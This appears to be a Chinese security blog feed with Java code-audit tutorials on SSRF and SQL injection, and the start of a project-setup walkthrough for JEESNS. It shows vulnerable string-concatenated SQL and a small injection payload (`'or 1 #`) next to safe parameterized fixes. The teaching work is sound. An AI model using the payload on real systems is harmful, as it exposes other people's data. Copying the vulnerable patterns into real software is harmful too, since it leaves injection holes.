class="string">"User-Agent"</span>, <span class="string">"Mozilla/5.0"</span>);</span><br><span class="line">con.getInputStream();</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>假设这里的 <code>URL</code> 使用户可控的，这段代码相对于上一段来说，会稍微 “安全” 些。如果攻击者想要使用 <code>gopher</code> 协议攻击内网服务，在第 <code>2</code> 行时，会由于类型强制转换失败而抛出异常。在异常抛出前，一直没有调用到 <code>connect()</code> 方法，所以请求并没有发出去。</p><blockquote><p>第 <code>2</code> 行的类型转换相当于限定了协议，在能够明确使用的协议的情况下，建议用这种方式对协议做限制。</p></blockquote><h1 id="其它发起请求的例子"><a href="#其它发起请求的例子" class="headerlink" title="其它发起请求的例子"></a>其它发起请求的例子</h1><h2 id="javax-imageio-ImageIO"><a href="#javax-imageio-ImageIO" class="headerlink" title="javax.imageio.ImageIO"></a>javax.imageio.ImageIO</h2><p>这是 <code>JDK</code> 自带的类，它的 <code>read()</code> 方法，用来加载图片。它可以传入一个 <code>URL</code> 对象，且没有协议限制，如下：</p><p>ImageIO.java:1386</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> BufferedImage <span class="title">read</span><span class="params">(URL input)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"input == null!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InputStream istream = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        istream = input.openStream();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IIOException(<span class="string">"Can't get input stream from URL!"</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    ImageInputStream stream = createImageInputStream(istream);</span><br><span class="line">    BufferedImage bi;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        bi = read(stream);</span><br><span class="line">        <span class="keyword">if</span> (bi == <span class="keyword">null</span>) &#123;</span><br><span class="line">            stream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        istream.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如果服务器在加载图片时，<code>URL</code> 是用户可控的，那么就会存在 <code>SSRF</code> 漏洞。</strong></p><h2 id="HttpClient"><a href="#HttpClient" class="headerlink" title="HttpClient"></a>HttpClient</h2><p>一个 <code>get</code> 请求的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CloseableHttpClient httpClient = HttpClients.createDefault();</span><br><span class="line">HttpGet getRequest = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">HttpResponse response = httpClient.execute(getRequest);</span><br></pre></td></tr></table></figure><p>问题同上。</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li><p>okhttp</p></li><li><p>Request</p></li><li><p>…</p></li></ul><h1 id="容易出现SSRF的功能点"><a href="#容易出现SSRF的功能点" class="headerlink" title="容易出现SSRF的功能点"></a>容易出现SSRF的功能点</h1><p>只要是能够对外发起网络请求的地方，就有可能会出现SSRF漏洞。</p><ul><li><p>从指定url获取内容</p></li><li><p>数据源连接</p></li><li><p>后台状态刷新</p></li><li><p>webmail (POP3/SMTP/IMAP)</p></li><li><p>文件处理 (加载图片/XML/PDF/ffpmg/ImageMagic)</p></li></ul><h1 id="修复策略"><a href="#修复策略" class="headerlink" title="修复策略"></a>修复策略</h1><ul><li><p>避免 <code>url</code> 用户可控，包括 <code>path</code></p></li><li><p>统一请求响应及错误信息</p></li><li><p>白名单校验url及ip</p></li><li><p>限制协议及端口</p></li><li><p>TTL 设置为 0，防止 <code>DNS Rebinding</code> 攻击（Java默认为 0）</p></li></ul><blockquote><p>可以参考 <a href="https://joychou.org" target="_blank" rel="noopener">@JoyChou</a> 师傅的<a href="https://github.com/JoyChou93/trident/blob/master/src/main/java/SSRF.java" target="_blank" rel="noopener">修复方案</a>。</p></blockquote><h1 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h1><ul><li><p><a href="https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf" target="_blank" rel="noopener">Build Your SSRF Exploit Framework</a></p></li><li><p><a href="https://joychou.org/java/javassrf.html" target="_blank" rel="noopener">SSRF in JAVA</a></p></li><li><p><a href="https://joychou.org/java/use-dnsrebinding-to-bypass-ssrf-in-java.html" target="_blank" rel="noopener">Use DNS Rebinding to Bypass SSRF in JAVA</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;最近的事情真的太多了 &lt;strong&gt;≧﹏≦&lt;/strong&gt; ，趁着刚搞完小组的面试，发篇热乎的。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://jayl1n.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="Java" scheme="https://jayl1n.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>从1开始的Java代码审计·第三弹·SQL注入</title>
    <link href="https://jayl1n.github.io/2018/11/15/java-audit-step-by-step-3/"/>
    <id>https://jayl1n.github.io/2018/11/15/java-audit-step-by-step-3/</id>
    <published>2018-11-15T15:47:52.000Z</published>
    <updated>2019-08-19T14:29:15.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SQL注入是什么，有什么用，就不多介绍了。总结下漏洞的原因，主要是由于开发者对用户的输入没有做好过滤，直接将用户的输入带入到 SQL语句中，导致恶意用户可以控制服务器执行的SQL语句。</p><p>在 Java 中，操作SQL的主要有以下几种方式：</p><ol><li><p><code>java.sql.Statement</code></p></li><li><p><code>java.sql.PrepareStatement</code></p></li><li><p>使用第三方 <code>ORM</code> 框架 —— <code>MyBatis</code> 或 <code>Hibernate</code></p></li></ol><p>下面我们来分析以上几种执行SQL的方式。</p><a id="more"></a><h1 id="java-sql-Statement"><a href="#java-sql-Statement" class="headerlink" title="java.sql.Statement"></a>java.sql.Statement</h1><p><code>java.sql.Statement</code> 是最原始的执行SQL的接口，使用它时，需要手动拼接SQL语句，如下面这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"SELECT * FROM user WHERE id = '"</span> + id + <span class="string">"'"</span>;</span><br><span class="line">Statement statement = connection.createStatement();</span><br><span class="line">statement.execute(sql);</span><br></pre></td></tr></table></figure><p>假设这里 <code>id</code> 参数是直接从用户的请求里获取的，并且没有经过过滤，那么这处代码就会存在SQL注入漏洞。</p><p>构造请求 <code>/?id=&#39;or 1 #</code>，服务器将 <code>&#39;or 1 #</code> 拼接到 sql 语句中，就会变成 <code>SELECT * FROM user WHERE id = &#39;&#39;or 1 #</code>，将返回 <code>user</code> 表的所有记录。</p><p>在任何时候，都不推荐使用 <code>java.sql.Statement</code> 这种方式来执行SQL。</p><p>因为这种方式写的代码可读性很差，容易出错，同时也存在很大的安全隐患。</p><h1 id="java-sql-PrepareStatement"><a href="#java-sql-PrepareStatement" class="headerlink" title="java.sql.PrepareStatement"></a>java.sql.PrepareStatement</h1><p>这个接口是对 <code>java.sql.Statement</code> 的拓展，拥有了防SQL注入的特性。</p><blockquote><p>Tip: <code>java.sql.Statement</code> 每次执行一条SQL，都要重新编译一次SQL。而 <code>java.sql.PreparedStatement</code> 预编译的方式，会将SQL缓存在数据库，可以重复调用，相比 <code>Statement</code> 效率要高一些。</p></blockquote><p>使用时，在SQL语句中，用 <code>?</code> 作为占位符，代替需要传入的参数，然后将该语句传递给数据库，数据库会对这条语句进行预编译。如果要执行这条SQL，只要用特定的 <code>set</code> 方法，将传入的参数设置到SQL语句中的指定位置，然后调用 <code>execute</code> 方法执行这条完整的SQL。示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"SELECT * FROM user WHERE id = ?"</span>;</span><br><span class="line"><span class="comment">//预编译语句</span></span><br><span class="line">PreparedStatement preparedStatement = connection.prepareStatement(sql);</span><br><span class="line"><span class="comment">//填入参数</span></span><br><span class="line">preparedStatement.setString(<span class="number">1</span>,reqStuId);</span><br><span class="line">preparedStatement.executeQuery();</span><br></pre></td></tr></table></figure><p>此时，如果我用之前的请求攻击，执行的SQL会变成 <code>SELECT * FROM user WHERE id = &#39;\&#39;or 1 #&#39;</code>，可以看到单引号是被转义了，同时参数也被一对单引号包裹，数字型注入也不存在了。</p><h2 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h2><h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><p>我们已经知道，通过占位符传参，不管传递的是什么类型的值，都会被单引号包裹。而使用 <code>ORDER BY</code> 时，要求传入的是字段名或者是字段位置，如：</p><ol><li><p><code>SELECT * FROM user ORDER BY id</code></p></li><li><p><code>SELECT * FROM user ORDER BY 1</code></p></li></ol><p><strong>如果传入的是引号包裹的字符串，那么 <code>ORDER BY</code> 会失效</strong>，如：<code>SELECT * FROM user ORDER BY &#39;id&#39;</code>。</p><p>所以，如果要动态传入 <code>ORDER BY</code> 参数，只能用字符串拼接的方式，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"SELECT * FROM user ORDER BY "</span> + column;</span><br></pre></td></tr></table></figure><p>那么这样依然可能会存在SQL注入的问题，在 <code>Java</code> 中会有两种情况：</p><ol><li><p>column 是字符串型</p><p> 这种情况和 <code>Statement</code> 中描述的一样，是存在注入的。要防御就必须要手动过滤，或者将字段名硬编码到 <code>SQL</code> 语句中，比如：</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String column = <span class="string">"id"</span>;</span><br><span class="line">String sql =<span class="string">""</span>;</span><br><span class="line"><span class="keyword">switch</span>(column)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"id"</span>:</span><br><span class="line">        sql = <span class="string">"SELECT * FROM user ORDER BY id"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"username"</span>:</span><br><span class="line">        sql = <span class="string">"SELECT * FROM user ORDER BY username"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>column 是 int 型</p><p> 因为 <code>Java</code> 是强类型语言，当用户传递的参数与后台定义的参数类型不匹配，程序会抛出异常，赋值失败。所以，不会存在注入的问题。</p></li></ol><blockquote><p>类似的， <code>GROUP BY</code> 也会有同样的问题。</p></blockquote><h1 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h1><p>基础篇提到的 <code>JEESNS</code> 用的就是 <code>MyBatis</code>，略过介绍。</p><p><code>MyBatis</code> 使用内联参数 <code>${example}</code> 或 <code>#{example}</code>，将查询的属性和参数做绑定，如下：</p><p>${}</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectStudentByStuId"</span> <span class="attr">resultMap</span>=<span class="string">"studentMap"</span>&gt;</span></span><br><span class="line">    SELECT *</span><br><span class="line">    FROM student</span><br><span class="line">    WHERE stu_id = $&#123;stuId&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>#{}</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectStudentByStuId"</span> <span class="attr">resultMap</span>=<span class="string">"studentMap"</span>&gt;</span></span><br><span class="line">    SELECT *</span><br><span class="line">    FROM student</span><br><span class="line">    WHERE stu_id = #&#123;stuId&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>两种方式有什么区别呢？接着看。</p><h2 id="（不安全的写法）"><a href="#（不安全的写法）" class="headerlink" title="${} （不安全的写法）"></a>${} <em>（不安全的写法）</em></h2><p>使用 <code>${foo}</code> 这样格式的传入参数会直接参与SQL编译，类似字符串拼接的效果，是存在SQL注入漏洞的。所以一般情况下，不会用这种方式绑定参数。</p><h2 id=""><a href="#" class="headerlink" title="#{}"></a>#{}</h2><p>使用 <code>#{}</code> 做参数绑定时， <code>MyBatis</code> 会将SQL语句进行预编译，避免SQL注入的问题。</p><p><code>MyBatis</code> 预编译模式的实现，在底层同样是依赖于 <code>java.sql.PreparedStatement</code>，所以 <code>PreparedStatement</code> 存在的问题，这里也会存在。</p><p><code>ORDER BY</code> 只能通过 <code>${}</code> 传递。为了避免SQL注入，需要手动过滤，或者在SQL里硬编码 <code>ORDER BY</code> 的字段名。</p><p>此外，还有一种情况 —— <code>LIKE</code> 模糊查询。</p><p>看下面这个写法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectStudentByFuzzyQuery"</span> <span class="attr">resultMap</span>=<span class="string">"studentMap"</span>&gt;</span></span><br><span class="line">    SELECT *</span><br><span class="line">    FROM student</span><br><span class="line">    WHERE student.stu_name</span><br><span class="line">            LIKE '%#&#123;stuName&#125;%'</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在这里，<code>MyBatis</code> 会把 <code>%#{stuName}%</code> 作为要查询的参数，数据库会执行 <code>SELECT * FROM student WHERE student.stu_name LIKE &#39;%#{stuName}%&#39;</code>，导致查询失败，所以这里只能用 <code>${}</code> 的方式传入。而如果用 <code>${}</code> 又存在SQL注入的风险，怎么办呢？</p><p>最好的方法是，使用数据库自带的 <code>CONCAT</code> ，将 <code>%</code> 和我们用 <code>#{}</code> 传入参数连接起来，这样就既不存在注入的问题，也能满足需求啦。示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectStudentByFuzzyQuery"</span> <span class="attr">resultMap</span>=<span class="string">"studentMap"</span>&gt;</span></span><br><span class="line">    SELECT *</span><br><span class="line">    FROM student</span><br><span class="line">    WHERE student.stu_name</span><br><span class="line">            LIKE CONCAT('%',#&#123;stuName&#125;,'%')</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Hibernate"><a href="#Hibernate" class="headerlink" title="Hibernate"></a>Hibernate</h1><p><code>Hibernate</code> 是一个高性能的 <code>ORM</code> 框架，可以自动生成 <code>SQL</code> 语句，通常与 <code>Struts</code>、<code>Spring</code> 一起搭配使用，也就是我们熟知的 <code>SSH</code> 框架。</p><p><code>Hibernate</code> 支持多种操作数据库的方式，包括原生的 <code>SQL</code>，以及自家的 <code>HQL</code>。</p><h2 id="原生SQL"><a href="#原生SQL" class="headerlink" title="原生SQL"></a>原生SQL</h2><p>原生 <code>SQL</code> 的注入和前面介绍过的注入都一样，都是拼接的问题，就不细讲了。这里介绍下 <code>Hibernate</code> 写原生 <code>SQL</code> 时，可能会用到的几种写法吧。</p><p>要使用原生 <code>SQL</code> ，都会调用到 <code>Sessions.createSQLQuery()</code> 方法。</p><p>下面看第一种写法，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">session.beginTranscation();</span><br><span class="line">List list = session.createSQLQuery(<span class="string">"SELECT id,name FROM student"</span>).list();</span><br><span class="line">session.getTranscation().commit();</span><br><span class="line"></span><br><span class="line"><span class="comment">//list 是查询的结果，list里的元素由Object数组构成</span></span><br><span class="line"><span class="comment">//Object数组的每个元素代表一个字段，需要强转才能使用</span></span><br><span class="line">Object[] record = (Object[]) list.get(<span class="number">0</span>);</span><br><span class="line">System.out.println(<span class="string">"id="</span>+(Integer) record[<span class="number">0</span>]+<span class="string">",name="</span>+(String) record[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>第二种，上面的例子中，<code>Hibernate</code> 会使用 <code>ResultSetMetadata</code> 返回的标量值的实际类型。但是如果过多使用它会降低程序性能，所以通常会用 <code>addScalar()</code> 提前指定返回值的类型。代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List list = session.createSQLQuery(<span class="string">"SELECT id,stu_name FROM student"</span>)</span><br><span class="line">                   .addScalar(<span class="string">"id"</span>, StandardBasicTypes.INTEGER)</span><br><span class="line">                   .addScalar(<span class="string">"stu_name"</span>, StandardBasicTypes.STRING)</span><br><span class="line">                   .list();</span><br></pre></td></tr></table></figure><p>第三种，上面的两个例子，返回的都是标量结果集，但是 <code>Hibernate</code> 是一个 <code>ORM</code> 框架，我们希望通过它，直接将返回的数据映射成对象。那怎么写呢？其实，很简单。只要为每个类和表写一个映射关系，让 <code>Hibernate</code> 知道该怎么把查到的数据转换成对象就行了（映射关系是如何写的，请自行百度）。然后，调用 <code>addEntity()</code> 将查询结果和类绑定一下，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; list = session.createSQLQuery(<span class="string">"SELECT * FROM student"</span>)</span><br><span class="line">                            .addEntity(Student.class)</span><br><span class="line">                            .list();</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Student映射文件 --&gt;</span></span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE hibernate-mapping PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Hibernate/Hibernate Mapping DTD 3.0//EN"</span></span><br><span class="line"><span class="meta">        "http://www.hibernate.org/dtd/hibernate-mapping-3.0.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hibernate-mapping</span> <span class="attr">package</span>=<span class="string">"edu.cuit.syclover.hibernate.Student"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">class</span> <span class="attr">name</span>=<span class="string">"edu.cuit.syclover.hibernate.Student"</span> <span class="attr">table</span>=<span class="string">"student"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"id"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"stuId"</span> <span class="attr">column</span>=<span class="string">"stu_id"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"stuName"</span> <span class="attr">column</span>=<span class="string">"stu_name"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"stuPassword"</span> <span class="attr">column</span>=<span class="string">"stu_password"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">hibernate-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="HQL"><a href="#HQL" class="headerlink" title="HQL"></a>HQL</h2><p><code>HQL</code> 是 <code>Hibernate</code> 独有的面向对象的查询语言，接近 <code>SQL</code>。<code>Hibernate</code>引擎会对 <code>HQL</code> 进行解析，翻译成 <code>SQL</code>，再将 <code>SQL</code> 交给数据库执行。</p><p>关于 <code>HQL</code> 的注入，限制很多。</p><p><code>HQL</code> 的限制如下：</p><ol><li><p>不能查询未做映射的表，所以想跨库查系统表基本没有希望。</p><p> 很多地方说 <code>HQL</code> 不支持 <code>UNION</code>，其实是错误的。<code>Hibernate</code> 支持 <code>UNION</code> 的。但是，想要使用 <code>UNION</code>，必须在模型的关系明确后可以，这种情况比较少见，所以会导致 <code>UNION</code> 失败。</p></li><li><p>表名，列名大小写敏感，查询时使用的列名大小写必须和映射类的属性一致。</p></li><li><p>不能用 <code>*</code>, <code>#</code> , <code>--</code></p></li><li><p>无延时函数</p></li></ol><p>所以，利用 <code>HQL</code> 是比较极限的一件事情。</p><blockquote><p>本文不讨论如何 <code>HQL</code> 注入，想了解更多的注入手法，可以看<a href="https://www.freebuf.com/articles/web/33954.html" target="_blank" rel="noopener">这篇文章</a>。</p></blockquote><p><code>HQL</code> 会出现注入的地方还是在字符串拼接的时候，审计的时候看看 <code>SQL</code> 是不是用加号 <code>+</code> 的就行了。</p><p>比如这个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; studentList = session.createQuery(<span class="string">"FROM Student s WHERE s.stuId = "</span> + stuId)</span><br><span class="line">                                   .list();</span><br></pre></td></tr></table></figure><p>下面来看看 <code>HQL</code> 能防注入的安全写法。</p><p>第一种，使用具名参数 <code>Named parameter</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; studentList = session.createQuery(<span class="string">"FROM Student s WHERE s.stuId = :stuId"</span>)</span><br><span class="line">                                   .setParameter(<span class="string">"stuId"</span>,stuId)</span><br><span class="line">                                   .list();</span><br></pre></td></tr></table></figure><p>第二种，占位符 <code>Positional parameter</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; studentList = session.createQuery(<span class="string">"FROM Student s WHERE s.stuId = ?"</span>)</span><br><span class="line">                                   .setParameter(stuId)</span><br><span class="line">                                   .list()</span><br></pre></td></tr></table></figure><p>这两种写法，和 <code>PreparesSatement</code> 的原理效果一样，都是以预编译的方式，通过参数绑定，将参数和 <code>SQL</code> 分离，保证 <code>SQL</code> 不被污染。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><p><a href="https://www.cnblogs.com/lcngu/p/5918363.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcngu/p/5918363.html</a></p></li><li><p><a href="https://www.w3cschool.cn/hibernate_articles/gapw1ioo.html" target="_blank" rel="noopener">https://www.w3cschool.cn/hibernate_articles/gapw1ioo.html</a> </p></li><li><p><a href="https://www.freebuf.com/articles/web/33954.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/33954.html</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;SQL注入是什么，有什么用，就不多介绍了。总结下漏洞的原因，主要是由于开发者对用户的输入没有做好过滤，直接将用户的输入带入到 SQL语句中，导致恶意用户可以控制服务器执行的SQL语句。&lt;/p&gt;
&lt;p&gt;在 Java 中，操作SQL的主要有以下几种方式：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;java.sql.Statement&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;java.sql.PrepareStatement&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;使用第三方 &lt;code&gt;ORM&lt;/code&gt; 框架 —— &lt;code&gt;MyBatis&lt;/code&gt; 或 &lt;code&gt;Hibernate&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下面我们来分析以上几种执行SQL的方式。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://jayl1n.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="Java" scheme="https://jayl1n.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>从1开始的Java代码审计·第二弹·基础篇（下）</title>
    <link href="https://jayl1n.github.io/2018/10/29/java-audit-step-by-step-2/"/>
    <id>https://jayl1n.github.io/2018/10/29/java-audit-step-by-step-2/</id>
    <published>2018-10-29T05:45:39.000Z</published>
    <updated>2019-08-19T14:29:15.826Z</updated>
    
    <content type="html"><![CDATA[<p>我们在审计一个项目的时候，最开始应该是先熟悉项目的结构，了解项目的技术栈。</p><p>本篇，我会引入一个开源的 Java Web 项目，通过实例分析 Java Web 的项目结构，常用的 MVC 模式。</p><a id="more"></a><h1 id="JEESNS"><a href="#JEESNS" class="headerlink" title="JEESNS"></a>JEESNS</h1><p><a href="https://github.com/zchuanzhao/jeesns" target="_blank" rel="noopener">JEESNS</a>，是一款基于 JAVA 企业级平台研发的社交管理系统，在 github 上有 200+ star，在开源的 Java Web 项目中算是还不错的了。在本章及后面的内容，我会用它做实例，进行审计分析。</p><p>项目地址： <a href="https://github.com/zchuanzhao/jeesns" target="_blank" rel="noopener">https://github.com/zchuanzhao/jeesns</a></p><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><p>你可以直接把项目 clone 下来，然后导入到 IDE。也可以直接在 IDEA 里把项目从 VCS（版本控制系统）中 checkout 出来。</p><p>下面我演示下，如何在 IDEA 里直接从 git 服务器上迁出项目。</p><ol><li><p>打开 IDEA，点<code>Check out from Version Control</code>，选择<code>Git</code>。<br><img src="/2018/10/29/java-audit-step-by-step-2/check1.png" alt="check1"></p></li><li><p>在弹出的 dialog 里，输入 git 的地址(<a href="https://github.com/zchuanzhao/jeesns.git)，以及本地保存的位置，然后`clone`。" target="_blank" rel="noopener">https://github.com/zchuanzhao/jeesns.git)，以及本地保存的位置，然后`clone`。</a><br><img src="/2018/10/29/java-audit-step-by-step-2/check2.png" alt="check2"></p></li><li><p>之后，IDEA 会开始下载项目，并构建，下面是构建完毕的项目工程。<br><img src="/2018/10/29/java-audit-step-by-step-2/check3.png" alt="check3"></p></li></ol><hr><h1 id="项目结构解析"><a href="#项目结构解析" class="headerlink" title="项目结构解析"></a>项目结构解析</h1><h2 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h2><h3 id="根目录下的-pom-xml"><a href="#根目录下的-pom-xml" class="headerlink" title="根目录下的 pom.xml"></a>根目录下的 pom.xml</h3><p>在项目的根目录下，有一个<code>pom.xml</code>的文件，这个文件的存在，表明项目是用<code>Maven</code>构建的，<a href="http://www.runoob.com/maven/maven-tutorial.html" target="_blank" rel="noopener">关于 Maven 可以点这里</a>。它是用来管理项目源码、配置文件，不过最大的用处还是处理<strong>项目的依赖关系</strong>。作用有点类似于 nodejs 的 npm，python 的 pip。</p><p>下面，点开这个<code>pom.xml</code>。</p><p><img src="/2018/10/29/java-audit-step-by-step-2/maven1.png" alt="maven1"></p><p>红框的 ① 